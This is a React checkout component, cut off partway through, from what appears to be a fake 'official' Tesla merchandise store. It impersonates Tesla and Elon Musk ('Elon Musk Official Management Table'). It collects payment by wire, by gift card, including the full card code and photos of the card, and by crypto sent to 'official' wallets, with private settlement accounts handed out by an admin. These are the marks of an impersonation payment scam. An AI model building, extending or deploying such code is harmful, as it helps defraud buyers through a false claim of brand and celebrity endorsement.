import React, { useState } from 'react';
import {
  X,
  Check,
  ShieldCheck,
  CheckCircle2,
  ChevronRight,
  Lock,
  Send,
  Copy,
  Mail,
  Clock,
  ShoppingBag,
  Minus,
  Plus,
  Package,
} from 'lucide-react';
import {
  MerchProduct,
  MerchQualityTier,
  TeslaOrder,
  AdminPaymentAccounts,
  PaymentAccountRequest,
  OfficialWalletSymbol,
  GiftCardPhotoUpload,
} from '../types';
import { mergeCompanyWallets } from '../data/officialWallets';
import { OfficialWalletsSelector } from './OfficialWalletsSelector';
import { CryptoPaymentConfirmBox } from './CryptoPaymentConfirmBox';
import { ACCEPTED_GIFT_CARD_TYPES, GiftCardPaymentPanel } from './GiftCardPaymentPanel';

interface MerchOrderModalProps {
  isOpen: boolean;
  product: MerchProduct | null;
  initialTierId?: string;
  initialSize?: string;
  onClose: () => void;
  onOrderCompleted: (order: TeslaOrder) => void;
  defaultReferralCode?: string;
  commissionPercent?: number;
  adminPaymentAccounts?: AdminPaymentAccounts;
  paymentAccountRequests?: PaymentAccountRequest[];
  onRequestPaymentAccount?: (payload: {
    paymentMethod: 'wire' | 'gift_card' | 'crypto';
    vehicleName: string;
    amountDue: number;
    visitorName: string;
    visitorEmail: string;
    note?: string;
    requestCategory?: 'vehicle' | 'merch' | 'charity_donation' | 'charity_support';
  }) => PaymentAccountRequest;
  onOpenInbox?: () => void;
  defaultCustomerName?: string;
  defaultCustomerEmail?: string;
}

export const MerchOrderModal: React.FC<MerchOrderModalProps> = ({
  isOpen,
  product,
  initialTierId,
  initialSize,
  onClose,
  onOrderCompleted,
  defaultReferralCode = '',
  commissionPercent = 5,
  adminPaymentAccounts,
  paymentAccountRequests = [],
  onRequestPaymentAccount,
  onOpenInbox,
  defaultCustomerName = '',
  defaultCustomerEmail = '',
}) => {
  if (!isOpen || !product) return null;

  return (
    <MerchOrderModalInner
      key={`${product.id}-${initialTierId || ''}-${initialSize || ''}`}
      product={product}
      initialTierId={initialTierId}
      initialSize={initialSize}
      onClose={onClose}
      onOrderCompleted={onOrderCompleted}
      defaultReferralCode={defaultReferralCode}
      commissionPercent={commissionPercent}
      adminPaymentAccounts={adminPaymentAccounts}
      paymentAccountRequests={paymentAccountRequests}
      onRequestPaymentAccount={onRequestPaymentAccount}
      onOpenInbox={onOpenInbox}
      defaultCustomerName={defaultCustomerName}
      defaultCustomerEmail={defaultCustomerEmail}
    />
  );
};

const MerchOrderModalInner: React.FC<{
  product: MerchProduct;
  initialTierId?: string;
  initialSize?: string;
  onClose: () => void;
  onOrderCompleted: (order: TeslaOrder) => void;
  defaultReferralCode: string;
  commissionPercent: number;
  adminPaymentAccounts?: AdminPaymentAccounts;
  paymentAccountRequests: PaymentAccountRequest[];
  onRequestPaymentAccount?: (payload: {
    paymentMethod: 'wire' | 'gift_card' | 'crypto';
    vehicleName: string;
    amountDue: number;
    visitorName: string;
    visitorEmail: string;
    note?: string;
    requestCategory?: 'vehicle' | 'merch' | 'charity_donation' | 'charity_support';
  }) => PaymentAccountRequest;
  onOpenInbox?: () => void;
  defaultCustomerName: string;
  defaultCustomerEmail: string;
}> = ({
  product,
  initialTierId,
  initialSize,
  onClose,
  onOrderCompleted,
  defaultReferralCode,
  commissionPercent,
  adminPaymentAccounts,
  paymentAccountRequests,
  onRequestPaymentAccount,
  onOpenInbox,
  defaultCustomerName,
  defaultCustomerEmail,
}) => {
  const defaultTier =
    product.qualityTiers.find((t) => t.id === initialTierId) || product.qualityTiers[0];
  const [selectedTier, setSelectedTier] = useState<MerchQualityTier>(defaultTier);
  const [selectedSize, setSelectedSize] = useState<string>(
    initialSize && product.sizes.includes(initialSize) ? initialSize : product.defaultSize
  );
  const [quantity, setQuantity] = useState<number>(1);
  const [imgError, setImgError] = useState<boolean>(false);

  const [step, setStep] = useState<'configure' | 'checkout' | 'confirmed'>('configure');
  const [customerName, setCustomerName] = useState(defaultCustomerName);
  const [customerEmail, setCustomerEmail] = useState(defaultCustomerEmail);
  const [customerPhone, setCustomerPhone] = useState('');
  const [deliveryAddress, setDeliveryAddress] = useState('');
  const [city, setCity] = useState('');
  const [postalCode, setPostalCode] = useState('');
  const [paymentMethod, setPaymentMethod] = useState<'wire' | 'gift_card' | 'crypto'>('wire');
  const [selectedCryptoSymbol, setSelectedCryptoSymbol] = useState<OfficialWalletSymbol>('BTC');
  const [cryptoPaymentConfirmed, setCryptoPaymentConfirmed] = useState<boolean>(false);
  const [cryptoTxHash, setCryptoTxHash] = useState<string>('');
  const [giftCardBrandId, setGiftCardBrandId] = useState<string>('apple');
  const [giftCardFormat, setGiftCardFormat] = useState<'physical' | 'ecode'>('physical');
  const [giftCardValueUsd, setGiftCardValueUsd] = useState<string>('');
  const [giftCardCode, setGiftCardCode] = useState<string>('');
  const [giftCardPhotos, setGiftCardPhotos] = useState<GiftCardPhotoUpload[]>([]);
  const [accountRequestNote, setAccountRequestNote] = useState('');
  const [copiedAccount, setCopiedAccount] = useState(false);
  const [referralCodeInput, setReferralCodeInput] = useState(defaultReferralCode);
  const [confirmedOrder, setConfirmedOrder] = useState<TeslaOrder | null>(null);

  const unitPrice = selectedTier.price;
  const totalPrice = unitPrice * quantity;

  const handleSubmitOrder = (e: React.FormEvent) => {
    e.preventDefault();
    if (!customerName.trim() || !customerEmail.trim()) return;
    if (paymentMethod === 'crypto' && !cryptoPaymentConfirmed) return;

    const now = new Date();
    const randomCode = Math.floor(100000 + Math.random() * 900000);
    const skuRef = `${product.skuPrefix}-${selectedTier.price}-${randomCode}`;
    const orderId = `TSLA-ORD-${Date.now().toString().slice(-6)}`;
    const paymentRefPrefix =
      paymentMethod === 'wire' ? 'WIRE' : paymentMethod === 'gift_card' ? 'GIFT' : selectedCryptoSymbol;
    const paymentRef =
      paymentMethod === 'crypto' && cryptoTxHash.trim()
        ? `${selectedCryptoSymbol}-${cryptoTxHash.trim()}`
        : `${paymentRefPrefix}-${Date.now().toString().slice(-6)}`;

    const formattedTimestamp = now.toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
    });

    const normalizedRef = referralCodeInput.trim().toUpperCase();
    const referralCommissionAmount = normalizedRef
      ? Math.round(totalPrice * (commissionPercent / 100) * 100) / 100
      : undefined;

    const itemDisplayName =
      quantity > 1
        ? `${product.name} (${selectedTier.name} × ${quantity})`
        : `${product.name} (${selectedTier.name})`;

    const selectedGiftBrand =
      ACCEPTED_GIFT_CARD_TYPES.find((b) => b.id === giftCardBrandId) || ACCEPTED_GIFT_CARD_TYPES[0];
    const cleanGiftCode = giftCardCode.trim();
    const giftCardLast4 = cleanGiftCode.length >= 4 ? cleanGiftCode.slice(-4).toUpperCase() : undefined;
    const giftCardParsedVal = Number(giftCardValueUsd);
    const giftCardFaceValue =
      Number.isFinite(giftCardParsedVal) && giftCardParsedVal > 0 ? giftCardParsedVal : totalPrice;

    const newOrder: TeslaOrder = {
      orderId,
      reservationVin: skuRef,
      vehicleId: product.id,
      vehicleName: itemDisplayName,
      isFlyingCar: false,
      itemCategory: 'merch',
      merchSize: selectedSize,
      merchQualityTier: `${selectedTier.gradeCode} · ${selectedTier.name} ($${selectedTier.price})`,
      merchMaterialSpec: selectedTier.materialSpec,
      merchQuantity: quantity,
      paymentType: 'full',
      paymentStatus: 'pending_admin_approval',
      paymentMethod,
      paymentReference:
        paymentMethod === 'gift_card'
          ? `GIFT-${selectedGiftBrand.badgeCode}-${Date.now().toString().slice(-5)}`
          : paymentRef,
      ...(paymentMethod === 'gift_card'
        ? {
            giftCardType: selectedGiftBrand.name,
            giftCardFormat,
            giftCardFaceValue,
            giftCardCodeLast4: giftCardLast4,
            giftCardPhotos: giftCardPhotos.length > 0 ? giftCardPhotos : undefined,
          }
        : {}),
      depositAmount: totalPrice,
      totalPrice,
      amountPaidToday: totalPrice,
      balanceDue: 0,
      selectedColor: { name: 'Matte Obsidian Black', hex: '#09090b', price: 0 },
      selectedInterior: { name: selectedTier.name, hex: '#18181b', price: 0 },
      selectedWheels: { name: `Size: ${selectedSize}`, size: `Qty ${quantity}`, price: 0 },
      selectedPackages: [
        {
          id: selectedTier.id,
          name: `${selectedTier.gradeCode} · ${selectedTier.name}`,
          price: unitPrice,
          description: selectedTier.materialSpec,
        },
      ],
      customerName: customerName.trim(),
      customerEmail: customerEmail.trim(),
      customerPhone: customerPhone.trim() || '+1 (555) 019-2834',
      deliveryAddress: deliveryAddress.trim() || 'Direct Courier Delivery',
      city: city.trim() || 'Austin, TX',
      postalCode: postalCode.trim() || '78701',
      orderDate: now.toLocaleDateString('en-US', {
        month: 'short',
        day: 'numeric',
        year: 'numeric',
      }),
      status: 'Pending Elon Musk Management Approval',
      estimatedDelivery: selectedTier.deliveryEstimate,
      referralCodeUsed: normalizedRef || undefined,
      referralCommissionPercent: normalizedRef ? commissionPercent : undefined,
      referralCommissionAmount,
      trackingHistory: [
        {
          id: `trk-init-${now.getTime()}`,
          stage: 'Production',
          title: 'Official Merchandise Order Submitted',
          details: `${quantity} × ${product.name} — ${selectedTier.gradeCode} (${selectedTier.name}, $${unitPrice}/ea · Size: ${selectedSize}) totaling $${totalPrice.toLocaleString()} via ${
            paymentMethod === 'gift_card'
              ? `GIFT CARD (${selectedGiftBrand.name}${giftCardPhotos.length > 0 ? `, ${giftCardPhotos.length} photo(s)` : ''})`
              : paymentMethod.toUpperCase()
          } (${paymentRef}) sent to Elon Musk Official Management Table for verification.`,
          location: `${deliveryAddress.trim() || 'Direct Shipping'}, ${city.trim() || 'Austin, TX'}`,
          timestamp: now.toISOString(),
          dateStr: formattedTimestamp,
          statusType: 'submitted',
        },
      ],
    };

    setConfirmedOrder(newOrder);
    onOrderCompleted(newOrder);
    setStep('confirmed');
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#020611]/90 backdrop-blur-md p-3 sm:p-5 overflow-y-auto animate-fadeIn">
      <div className="w-full max-w-4xl rounded-2xl bg-[#061024] border border-blue-500/45 shadow-2xl overflow-hidden flex flex-col max-h-[92vh] my-auto">
        {/* Header */}
        <div className="p-5 border-b border-blue-900/60 flex items-center justify-between bg-gradient-to-r from-[#091630] via-[#0d1f44] to-[#230b18]">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-blue-600 to-red-600 flex items-center justify-center text-white shadow-md">
              <ShoppingBag className="w-5 h-5 text-white" />
            </div>
            <div>
              <h3 className="font-display font-bold text-lg text-white">
                {product.name}
              </h3>
              <p className="text-xs text-blue-200/80 font-mono">
                {product.categoryLabel} · Quality-Graded Collection
              </p>
            </div>
          </div>

          <button
            type="button"
            onClick={onClose}
            aria-label="Close merchandise order modal"
            className="p-1.5 rounded-lg text-slate-300 hover:text-white hover:bg-blue-900/50 transition-colors cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* STEP 1: CONFIGURE QUALITY TIER & SIZE */}
        {step === 'configure' && (
          <div className="flex-1 overflow-y-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-8">
            {/* Left Product Preview */}
            <div className="lg:col-span-5 space-y-5">
              <div className="relative aspect-[4/3] rounded-xl overflow-hidden bg-[#040a18] border border-blue-900/60 shadow-lg">
                {imgError ? (
                  <div className="w-full h-full flex flex-col items-center justify-center text-slate-400 p-6 text-center">
                    <Package className="w-10 h-10 text-blue-400 mb-2" />
                    <span className="text-xs font-mono uppercase">{product.name}</span>
                  </div>
                ) : (
                  <img
                    src={product.image}
                    alt={`${product.name} studio photograph`}
                    referrerPolicy="no-referrer"
                    onError={() => setImgError(true)}
                    className="w-full h-full object-cover object-center"
                  />
                )}
                <div className="absolute inset-0 bg-gradient-to-t from-[#040a18]/85 via-transparent to-transparent" />
                <div className="absolute bottom-3 left-3 right-3 flex items-center justify-between text-xs font-mono">
                  <span className="text-white font-semibold">{selectedTier.gradeCode} · {selectedTier.name}</span>
                  <span className="text-blue-200 font-bold tabular-nums">${selectedTier.price}</span>
                </div>
              </div>

              <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/60 space-y-2.5 text-xs">
                <div className="text-[11px] font-mono uppercase tracking-wider text-blue-300 font-semibold">
                  Selected Textile &amp; Build Spec
                </div>
                <div className="font-mono font-bold text-white">{selectedTier.materialSpec}</div>
                <p className="text-slate-300 leading-relaxed">{selectedTier.craftsmanshipNote}</p>
                <div className="pt-2 border-t border-blue-900/50 space-y-1.5">
                  {product.highlights.map((item) => (
                    <div key={item} className="flex items-start gap-2 text-slate-200">
                      <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0 mt-0.5" />
                      <span>{item}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Right Configurator */}
            <div className="lg:col-span-7 space-y-6">
              {/* 1. Quality Tier Pricing ($50 - $500) */}
              <div className="space-y-2.5">
                <div className="flex items-center justify-between text-xs font-semibold">
                  <span className="text-slate-100">1. Select Quality Grade ($50 – $500)</span>
                  <span className="text-blue-300 font-mono tabular-nums">${selectedTier.price} USD</span>
                </div>
                <div className="space-y-2">
                  {product.qualityTiers.map((tier) => {
                    const isSelected = selectedTier.id === tier.id;
                    return (
                      <button
                        key={tier.id}
                        type="button"
                        onClick={() => setSelectedTier(tier)}
                        className={`w-full p-3.5 rounded-xl border text-left transition-all cursor-pointer flex items-start justify-between gap-3 ${
                          isSelected
                            ? 'bg-blue-600/20 border-blue-400 text-white shadow-md'
                            : 'bg-[#08142b] border-blue-900/60 text-slate-300 hover:border-blue-500/60'
                        }`}
                      >
                        <div className="space-y-1 min-w-0">
                          <div className="flex items-center gap-2 text-xs font-bold">
                            <span className="font-mono text-[11px] text-blue-300">{tier.gradeCode}</span>
                            <span className="text-slate-600">·</span>
                            <span className="text-white">{tier.name}</span>
                          </div>
                          <div className="text-[11px] font-mono text-slate-300">{tier.materialSpec}</div>
                          <p className="text-[11px] text-slate-400 leading-snug">{tier.craftsmanshipNote}</p>
                        </div>
                        <div className="text-right shrink-0">
                          <div className="text-base font-mono font-bold text-white tabular-nums">
                            ${tier.price}
                          </div>
                          <div className="text-[10px] font-mono text-blue-300">{tier.deliveryEstimate}</div>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* 2. Size Selection */}
              <div className="space-y-2.5">
                <div className="flex items-center justify-between text-xs font-semibold">
                  <span className="text-slate-100">2. Select Size / Fit</span>
                  <span className="text-blue-300 font-mono">{selectedSize}</span>
                </div>
                <div className="flex flex-wrap gap-2">
                  {product.sizes.map((size) => {
                    const active = selectedSize === size;
                    return (
                      <button
                        key={size}
                        type="button"
                        onClick={() => setSelectedSize(size)}
                        className={`px-3.5 py-2 rounded-lg border text-xs font-mono font-semibold transition-all cursor-pointer ${
                          active
                            ? 'bg-gradient-to-r from-blue-600 to-red-600 border-blue-400 text-white'
                            : 'bg-[#08142b] border-blue-900/60 text-slate-300 hover:border-blue-500/60 hover:text-white'
                        }`}
                      >
                        {size}
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* 3. Quantity & Live Total */}
              <div className="p-4 rounded-xl bg-[#08142b] border border-blue-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div className="flex items-center gap-3">
                  <span className="text-xs font-semibold text-slate-200">Quantity</span>
                  <div className="inline-flex items-center rounded-lg bg-[#040a18] border border-blue-900/70">
                    <button
                      type="button"
                      onClick={() => setQuantity((q) => Math.max(1, q - 1))}
                      aria-label="Decrease quantity"
                      className="p-2 text-slate-300 hover:text-white cursor-pointer"
                    >
                      <Minus className="w-3.5 h-3.5" />
                    </button>
                    <span className="px-3 text-xs font-mono font-bold text-white tabular-nums">
                      {quantity}
                    </span>
                    <button
                      type="button"
                      onClick={() => setQuantity((q) => Math.min(20, q + 1))}
                      aria-label="Increase quantity"
                      className="p-2 text-slate-300 hover:text-white cursor-pointer"
                    >
                      <Plus className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>

                <div className="text-left sm:text-right">
                  <div className="text-[11px] font-mono text-slate-400 uppercase">
                    Order Total (Complimentary Courier Shipping)
                  </div>
                  <div className="text-2xl font-display font-bold text-white font-mono tabular-nums">
                    ${totalPrice.toLocaleString()}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* STEP 2: CHECKOUT & MANAGEMENT VERIFICATION */}
        {step === 'checkout' && (
          <form onSubmit={handleSubmitOrder} className="flex-1 overflow-y-auto p-6 space-y-6">
            <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/60 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div>
                <div className="text-xs text-red-300 uppercase font-mono font-semibold">
                  Official Merchandise Checkout
                </div>
                <h4 className="text-base font-bold text-white">{product.name}</h4>
                <div className="text-xs text-slate-300 font-mono">
                  {selectedTier.gradeCode} · {selectedTier.name} · Size: {selectedSize} · Qty: {quantity}
                </div>
              </div>

              <div className="text-right sm:border-l sm:border-blue-900/60 sm:pl-6">
                <div className="text-xs text-slate-400">Amount Due</div>
                <div className="text-2xl font-display font-bold text-blue-300 font-mono tabular-nums">
                  ${totalPrice.toLocaleString()}
                </div>
                <div className="text-[11px] text-slate-400 font-mono tabular-nums">
                  ${unitPrice}/unit · {selectedTier.deliveryEstimate}
                </div>
              </div>
            </div>

            {/* Shipping & Contact */}
            <div className="space-y-4">
              <h4 className="text-xs font-bold text-slate-100 uppercase tracking-wider">
                1. Shipping &amp; Contact Information
              </h4>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-200">Full Name</label>
                  <input
                    type="text"
                    required
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    placeholder="e.g. Jordan Mercer"
                    className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                  />
                </div>
                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-200">Email Address</label>
                  <input
                    type="email"
                    required
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    placeholder="jordan@domain.com"
                    className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-200">Phone Number</label>
                  <input
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    placeholder="+1 (555) 019-2834"
                    className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                  />
                </div>
                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-200">Street Address</label>
                  <input
                    type="text"
                    required
                    value={deliveryAddress}
                    onChange={(e) => setDeliveryAddress(e.target.value)}
                    placeholder="Street Address & Apt/Suite"
                    className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                  />
                </div>
                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-200">City &amp; Postal Code</label>
                  <div className="grid grid-cols-2 gap-2">
                    <input
                      type="text"
                      value={city}
                      onChange={(e) => setCity(e.target.value)}
                      placeholder="Austin, TX"
                      className="w-full px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                    />
                    <input
                      type="text"
                      value={postalCode}
                      onChange={(e) => setPostalCode(e.target.value)}
                      placeholder="78701"
                      className="w-full px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                    />
                  </div>
                </div>
              </div>

              <div className="space-y-1">
                <div className="flex items-center justify-between text-xs">
                  <label className="font-semibold text-slate-200">Referral Code (Optional)</label>
                  <span className="text-[11px] font-mono text-emerald-400 tabular-nums">
                    Referrer earns {commissionPercent}% (${(Math.round(totalPrice * (commissionPercent / 100) * 100) / 100).toFixed(2)})
                  </span>
                </div>
                <input
                  type="text"
                  value={referralCodeInput}
                  onChange={(e) => setReferralCodeInput(e.target.value.toUpperCase())}
                  placeholder="e.g. ELON-XXXX-XX"
                  className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 font-mono uppercase focus:outline-none focus:border-blue-400"
                />
              </div>
            </div>

            {/* Payment Method */}
            <div className="space-y-4">
              <h4 className="text-xs font-bold text-slate-100 uppercase tracking-wider">
                2. Payment Method
              </h4>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <button
                  type="button"
                  onClick={() => {
                    setPaymentMethod('wire');
                    setCryptoPaymentConfirmed(false);
                  }}
                  className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                    paymentMethod === 'wire'
                      ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                      : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                  }`}
                >
                  Wire Transfer / ACH
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setPaymentMethod('gift_card');
                    setCryptoPaymentConfirmed(false);
                  }}
                  className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                    paymentMethod === 'gift_card'
                      ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                      : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                  }`}
                >
                  Gift Card
                </button>
                <button
                  type="button"
                  onClick={() => setPaymentMethod('crypto')}
                  className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                    paymentMethod === 'crypto'
                      ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                      : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                  }`}
                >
                  Official Crypto &amp; PayPal USD
                </button>
              </div>

              {paymentMethod === 'crypto' && (
                <div className="space-y-3">
                  <OfficialWalletsSelector
                    wallets={mergeCompanyWallets(adminPaymentAccounts?.companyWallets)}
                    selectedSymbol={selectedCryptoSymbol}
                    onSelectSymbol={(sym) => {
                      setSelectedCryptoSymbol(sym);
                      setCryptoPaymentConfirmed(false);
                    }}
                  />
                  <CryptoPaymentConfirmBox
                    amountUsd={totalPrice}
                    walletSymbol={selectedCryptoSymbol}
                    confirmed={cryptoPaymentConfirmed}
                    onConfirmChange={setCryptoPaymentConfirmed}
                    txHash={cryptoTxHash}
                    onTxHashChange={setCryptoTxHash}
                  />
                </div>
              )}

              {paymentMethod === 'gift_card' && (
                <GiftCardPaymentPanel
                  amountDueUsd={totalPrice}
                  selectedBrandId={giftCardBrandId}
                  onSelectBrandId={setGiftCardBrandId}
                  cardFormat={giftCardFormat}
                  onChangeCardFormat={setGiftCardFormat}
                  cardValueUsd={giftCardValueUsd}
                  onChangeCardValueUsd={setGiftCardValueUsd}
                  cardCode={giftCardCode}
                  onChangeCardCode={setGiftCardCode}
                  photos={giftCardPhotos}
                  onChangePhotos={setGiftCardPhotos}
                  adminInstructions={
                    paymentAccountRequests.find(
                      (r) => r.paymentMethod === 'gift_card' && r.status === 'issued' && r.issuedAccountDetails
                    )?.issuedAccountDetails?.trim() || adminPaymentAccounts?.giftCardInstructions?.trim()
                  }
                />
              )}

              {(() => {
                const issuedRequest = paymentAccountRequests.find(
                  (r) => r.paymentMethod === paymentMethod && r.status === 'issued' && r.issuedAccountDetails
                );
                const pendingRequest = paymentAccountRequests.find(
                  (r) => r.paymentMethod === paymentMethod && r.status === 'pending_admin'
                );
                const globalAccount =
                  paymentMethod === 'wire'
                    ? adminPaymentAccounts?.wireDetails?.trim()
                    : paymentMethod === 'gift_card'
                    ? adminPaymentAccounts?.giftCardInstructions?.trim()
                    : '';
                const activeAdminAccount = issuedRequest?.issuedAccountDetails?.trim() || globalAccount || '';

                if (paymentMethod === 'gift_card') {
                  return null;
                }

                if (paymentMethod === 'crypto' && !issuedRequest?.issuedAccountDetails?.trim()) {
                  return null;
                }

                if (activeAdminAccount) {
                  return (
                    <div className="p-4 rounded-xl bg-[#08142b] border border-emerald-500/45 text-xs text-slate-200 space-y-2.5">
                      <div className="flex items-center justify-between gap-2">
                        <div className="font-semibold text-white flex items-center gap-1.5">
                          <ShieldCheck className="w-4 h-4 text-emerald-400" />
                          <span>Elon Musk Management-Issued Settlement Account</span>
                        </div>
                        <button
                          type="button"
                          onClick={() => {
                            navigator.clipboard.writeText(activeAdminAccount);
                            setCopiedAccount(true);
                            setTimeout(() => setCopiedAccount(false), 2000);
                          }}
                          className="px-2.5 py-1 rounded-md bg-[#040a18] border border-blue-800/70 text-[11px] font-mono text-blue-200 hover:text-white flex items-center gap-1 cursor-pointer"
                        >
                          {copiedAccount ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          <span>{copiedAccount ? 'Copied' : 'Copy'}</span>
                        </button>
                      </div>
                      <div className="p-3 rounded-lg bg-[#040a18] border border-blue-900/70 font-mono text-[11px] text-blue-200 whitespace-pre-wrap break-all tabular-nums">
                        {activeAdminAccount}
                      </div>
                    </div>
                  );
                }

                if (pendingRequest) {
                  return (
                    <div className="p-4 rounded-xl bg-[#08142b] border border-blue-500/45 text-xs text-slate-200 space-y-3">
                      <div className="flex items-center justify-between gap-2">
                        <div className="font-semibold text-white flex items-center gap-2">
                          <Clock className="w-4 h-4 text-blue-400" />
                          <span>Settlement Account Request Submitted</span>
                        </div>
                        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-blue-950 border border-blue-500/40 text-blue-200">
                          {pendingRequest.id}
                        </span>
                      </div>
                      <p className="text-[11px] text-slate-300 leading-relaxed">
                        Your settlement credential request is queued with the Elon Musk Official Management Table. Once provisioned, details will appear here and in your In-App Inbox.
                      </p>
                      {onOpenInbox && (
                        <button
                          type="button"
                          onClick={onOpenInbox}
                          className="px-3.5 py-2 rounded-lg bg-[#040a18] border border-blue-500/45 hover:border-blue-400 text-blue-200 hover:text-white text-xs font-semibold flex items-center gap-1.5 cursor-pointer"
                        >
                          <Mail className="w-3.5 h-3.5 text-blue-400" />
                          <span>Open In-App Inbox</span>
                        </button>
                      )}
                    </div>
                  );
                }

                return (
                  <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/70 text-xs text-slate-200 space-y-3">
                    <div className="flex items-center justify-between gap-2">
                      <div className="font-semibold text-white flex items-center gap-2">
                        <Lock className="w-4 h-4 text-red-400" />
                        <span>Official Settlement Account Provisioning</span>
                      </div>
                      <span className="text-[10px] font-mono text-red-300 uppercase">Verified Desk</span>
                    </div>
                    <p className="text-[11px] text-slate-300 leading-relaxed">
                      Request private settlement details from the Elon Musk Official Management Table prior to initiating payment, or place your order below to receive credentials directly in your In-App Inbox.
                    </p>
                    <div className="flex flex-col sm:flex-row gap-2">
                      <input
                        type="text"
                        value={accountRequestNote}
                        onChange={(e) => setAccountRequestNote(e.target.value)}
                        placeholder="Optional preferred network / bank note..."
                        className="flex-1 px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
                      />
                      {onRequestPaymentAccount && (
                        <button
                          type="button"
                          onClick={() => {
                            onRequestPaymentAccount({
                              paymentMethod,
                              vehicleName: `${product.name} (${selectedTier.name} · ${selectedSize} × ${quantity})`,
                              amountDue: totalPrice,
                              visitorName: customerName.trim() || 'Apparel Buyer',
                              visitorEmail: customerEmail.trim() || 'buyer@inapp.local',
                              note: accountRequestNote.trim() || undefined,
                              requestCategory: 'merch',
                            });
                            setAccountRequestNote('');
                          }}
                          className="px-4 py-2 rounded-lg bg-gradient-to-r from-blue-600 to-red-600 hover:brightness-110 text-white text-xs font-bold flex items-center justify-center gap-1.5 cursor-pointer whitespace-nowrap"
                        >
                          <Send className="w-3.5 h-3.5" />
                          <span>Request Account</span>
                        </button>
                      )}
                    </div>
                  </div>
                );
              })()}
            </div>

            <div className="pt-3 flex items-center justify-end gap-3 border-t border-blue-900/60">
              <button
                type="button"
                onClick={() => setStep('configure')}
                className="px-4 py-2.5 rounded-xl bg-[#08142b] border border-blue-800/70 text-slate-300 hover:text-white text-xs font-semibold cursor-pointer"
              >
                Back to Quality &amp; Size
              </button>
              <button
                type="submit"
                disabled={paymentMethod === 'crypto' && !cryptoPaymentConfirmed}
                className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 disabled:opacity-45 disabled:cursor-not-allowed text-white text-xs font-bold shadow-lg cursor-pointer flex items-center gap-2"
              >
                <Check className="w-4 h-4" />
                <span>
                  {paymentMethod === 'crypto' && !cryptoPaymentConfirmed
                    ? `Confirm ${selectedCryptoSymbol} Payment Above to Proceed`
                    : `Submit Order ($${totalPrice.toLocaleString()})`}
                </span>
              </button>
            </div>
          </form>
        )}

        {/* STEP 3: CONFIRMED RECEIPT */}
        {step === 'confirmed' && confirmedOrder && (
          <div className="flex-1 overflow-y-auto p-6 space-y-5">
            <div className="p-5 rounded-2xl bg-emerald-950/35 border border-emerald-500/45 flex items-start gap-4">
              <div className="w-10 h-10 rounded-xl bg-emerald-600/25 border border-emerald-400/50 flex items-center justify-center shrink-0">
                <CheckCircle2 className="w-6 h-6 text-emerald-400" />
              </div>
              <div className="space-y-1">
                <div className="text-xs font-mono text-emerald-300 font-bold uppercase">
                  Order Logged · Pending Verification
                </div>
                <h4 className="font-display text-xl font-bold text-white">
                  {confirmedOrder.vehicleName}
                </h4>
                <p className="text-xs text-slate-300 leading-relaxed">
                  Order #{confirmedOrder.orderId} has been transmitted to the Elon Musk Official Management Table. Check your In-App Inbox or My Orders modal for tracking and approval updates.
                </p>
              </div>
